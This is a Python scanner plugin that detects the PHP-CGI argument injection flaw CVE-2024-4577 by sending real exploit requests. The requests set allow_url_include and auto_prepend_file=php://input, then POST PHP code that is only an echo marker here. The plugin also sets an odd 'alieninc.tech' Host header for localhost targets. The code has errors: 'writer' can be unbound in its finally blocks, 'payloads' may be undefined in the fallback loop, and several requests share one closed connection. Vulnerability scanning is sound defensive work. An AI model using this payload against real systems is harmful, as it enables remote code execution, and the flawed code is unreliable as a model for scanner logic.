import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class PHPCGIInjection4577(NaslPlugin):
    PLUGIN_ID = 1261
    NAME = "PHP CGI Argument Injection RCE (CVE-2024-4577)"
    FAMILY = "Web Servers"
    CVSS_SCORE = 9.8
    DESCRIPTION = "PHP Installations on Windows with CGI mode are vulnerable to an argument injection attack enabling unauthenticated remote code execution."
    SOLUTION = "Upgrade PHP to version 8.1.29, 8.2.20, 8.3.8 or later. Disable CGI mode if not required."
    CVE = ["CVE-2024-4577"]
    PORTS = [80, 443, 8080, 8443]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = "https" if port_to_check in (443, 8443) else "http"
                ctx = None
                if scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                )
                host_header = target
                if target in ("127.0.0.1", "localhost", "::1"):
                    host_header = "alieninc.tech"
                payloads = [
                    "/php-cgi/php-cgi.exe?%2add+allow_url_include%3don+%2dd+auto_prepend_file%3dphp://input",
                    "/cgi-bin/php-cgi.exe?%2add+allow_url_include%3don+%2dd+auto_prepend_file%3dphp://input",
                    "/php-cgi/php.exe?%2add+allow_url_include%3don+%2dd+auto_prepend_file%3dphp://input",
                ]
                body_data = b"<?php echo 'CVE-2024-4577'; ?>"
                for payload in payloads:
                    request = (
                        f"POST {payload} HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body_data)}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode() + body_data
                    writer.write(request)
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
                    decoded = response.decode("utf-8", errors="replace")
                    body = decoded.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded else ""
                    if "CVE-2024-4577" in body:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port_to_check,
                            cvss_score=self.CVSS_SCORE,
                            severity=self.severity_from_cvss(self.CVSS_SCORE),
                            description=self.DESCRIPTION,
                            solution=self.SOLUTION,
                            evidence=f"PHP CGI argument injection confirmed at {payload}.",
                            references=self.CVE
                        ))
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
            finally:
                if writer:
                    writer.close()
                    await writer.wait_closed()
        if not results:
            for port_to_check in (self.PORTS if port is None else [port]):
                try:
                    scheme = "https" if port_to_check in (443, 8443) else "http"
                    ctx = None
                    if scheme == "https":
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                    )
                    host_header = target
                    if target in ("127.0.0.1", "localhost", "::1"):
                        host_header = "alieninc.tech"
                    for payload in payloads:
                        request = (
                            f"GET {payload} HTTP/1.1\r\n"
                            f"Host: {host_header}\r\n"
                            f"Connection: close\r\n"
                            f"\r\n"
                        )
                        writer.write(request.encode())
                        await writer.drain()
                        response = b""
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                            if not chunk:
                                break
                            response += chunk
                        decoded = response.decode("utf-8", errors="replace")
                        body = decoded.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded else ""
                        if any(x in body for x in ["PHP Warning", "PHP Notice", "allow_url_include", "unable to load"]):
                            results.append(PluginResult(
                                vulnerable=False,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity="medium",
                                description=self.DESCRIPTION,
                                solution=self.SOLUTION,
                                evidence=f"PHP CGI endpoint exposed at {payload}. Further investigation required.",
                                references=self.CVE
                            ))
                            break
                except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                    continue
                finally:
                    if writer:
                        writer.close()
                        await writer.wait_closed()
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description="No issues detected"))
        return results
